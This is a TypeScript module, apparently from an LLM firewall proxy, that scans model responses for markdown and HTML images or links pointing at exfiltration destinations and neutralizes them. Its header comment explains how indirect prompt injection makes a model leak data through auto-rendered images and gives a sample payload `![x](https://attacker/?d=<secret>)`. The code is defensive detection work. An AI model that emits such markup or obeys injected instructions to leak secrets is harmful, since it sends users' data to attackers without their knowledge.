// Response-side exfiltration detection.
//
// A model whose context was poisoned (indirect prompt injection) often exfils
// data by emitting markup the CLIENT auto-renders. The classic zero-click vector
// is a markdown image — `![x](https://attacker/?d=<secret>)` — which the chat UI
// fetches immediately, leaking the query string to the attacker without the user
// ever clicking. Markdown/HTML links are the one-click variant. The firewall sees
// this in the model's RESPONSE, not the request, so it needs its own scan.
//
// This module is pure: it extracts candidate URLs from response text and asks an
// injected predicate whether each destination is an exfil sink (the proxy backs
// that predicate with the existing UrlClassifier, so the allowlist, known-sink
// list, DGA and path-exfil heuristics are all reused). No network, no provider
// coupling — it scans the raw decoded body, so it works for every provider shape.

export interface ExfilFinding {
  url: string
  /** How the URL was embedded — markdown image is the highest concern (auto-fetched). */
  kind: 'markdown-image' | 'markdown-link' | 'html-image'
  reason: string
}

// Every URL pattern also takes a scheme-relative `//host/...`, which a
// browser resolves to https (parseUrl does the same).
// `!\[alt\](url)` — markdown image. URL stops at whitespace, ')' or '>'.
const MD_IMAGE_RE = /!\[[^\]]*\]\(\s*<?((?:https?:)?\/\/[^\s)>]+)(?:>[^)]*|\s[^)]*)?\)/gi
// `\[text\](url)` — markdown link (not preceded by '!', which is the image form).
const MD_LINK_RE = /(?<!!)\[[^[\]]*\]\(\s*<?((?:https?:)?\/\/[^\s)>]+)(?:>[^)]*|\s[^)]*)?\)/gi
// `[label]: url` — a link reference definition (#574). `![alt][label]` (and
// `![label]`) fetch its URL like an inline image, so it is reported as one.
// Any `]:` before a URL counts, whatever starts the line: a definition may sit
// in a blockquote or a list item, its label may hold escapes, and the body is
// often raw JSON with escaped line breaks, so recognising "a definition line"
// exactly as a renderer does is a parser differential waiting to happen.
// Only an exfil destination is ever reported, so a `]:` in prose costs
// nothing unless it points at one. The destination may follow on the next
// line, after one line ending, raw or JSON-escaped.
const MD_DEF_RE = /\]:[ \t]*(?:(?:\r?\n|\\r\\n|\\n)[ \t]*)?<?((?:https?:)?\/\/[^\s>"\\]+)/gi
// `<img ... src="url">` — HTML image (some renderers allow raw HTML). Each tag
// is read once, to its `>` outside quotes (imgTags), and its src taken from that
// tag alone. One regex with a lazy attribute scan restarted at every `<img`
// and ran to the end of the text when no URL followed: 400 KB of `<img src="`
// took 10.5 s on the request thread (GHSA-983r-9gmc-f3xr). In a raw JSON body
// the attribute's quote arrives escaped (`src=\"...\"`).
const IMG_OPEN_RE = /<img\b/gi
const SRC_ATTR_RE = /\bsrc\s*=\s*\\?["']?((?:https?:)?\/\/[^"'\s>\\]+)/gi

/** The text of each `<img ...>` tag, each read once: linear in `text`. */
function imgTags(text: string): string[] {
  const tags: string[] = []
  IMG_OPEN_RE.lastIndex = 0
  for (let m = IMG_OPEN_RE.exec(text); m !== null; m = IMG_OPEN_RE.exec(text)) {
    let i = m.index + m[0].length
    let quote = ''
    for (; i < text.length; i++) {
      const c = text[i]
      if (quote) { if (c === quote) quote = '' }
      else if (c === '"' || c === "'") quote = c
      else if (c === '>') break
    }
    tags.push(text.slice(m.index, i + 1))
    IMG_OPEN_RE.lastIndex = i + 1
  }
  return tags
}

function parseUrl(u: string): { hostname: string; path: string } | null {
  try {
    const url = new URL(u.startsWith('//') ? `https:${u}` : u)
    return { hostname: url.hostname, path: url.pathname + url.search }
  } catch {
    return null
  }
}

/**
 * Scan response text for exfiltration markup.
 *
 * @param text       the decoded model response (raw JSON/SSE text is fine — URLs
 *                   live inside the text fields and are matched literally)
 * @param isExfil    predicate deciding whether a (hostname, path) is an exfil
 *                   sink; backed by UrlClassifier in production
 * @returns deduped findings, markdown images first (highest concern)
 */
export function scanResponseExfil(
  text: string,
  isExfil: (hostname: string, path: string) => boolean,
): ExfilFinding[] {
  if (!text) return []
  const findings: ExfilFinding[] = []
  const seen = new Set<string>()

  const scan = (re: RegExp, kind: ExfilFinding['kind'], input = text) => {
    re.lastIndex = 0
    for (let m = re.exec(input); m !== null; m = re.exec(input)) {
      const url = m[1]
      if (!url) {
        if (m.index === re.lastIndex) re.lastIndex++
        continue
      }
      const parsed = parseUrl(url)
      if (parsed && isExfil(parsed.hostname, parsed.path)) {
        const key = kind + '|' + url
        if (!seen.has(key)) {
          seen.add(key)
          findings.push({ url, kind, reason: `${kind} points at an exfiltration destination (${parsed.hostname})` })
        }
      }
      if (m.index === re.lastIndex) re.lastIndex++
    }
  }

  scan(MD_IMAGE_RE, 'markdown-image')
  scan(MD_DEF_RE, 'markdown-image')
  for (const tag of imgTags(text)) scan(SRC_ATTR_RE, 'html-image', tag)
  scan(MD_LINK_RE, 'markdown-link')
  return findings
}

/**
 * Neutralize exfil URLs in a (buffered) response body by replacing each offending
 * URL with an inert placeholder, keeping the surrounding text/JSON intact so the
 * agent still receives a valid turn — just without the auto-fetch.
 */
export function neutralizeExfil(body: string, findings: ExfilFinding[]): string {
  let out = body
  for (const f of findings) {
    out = out.split(f.url).join('llm-fw-blocked-exfil-url')
  }
  return out
}
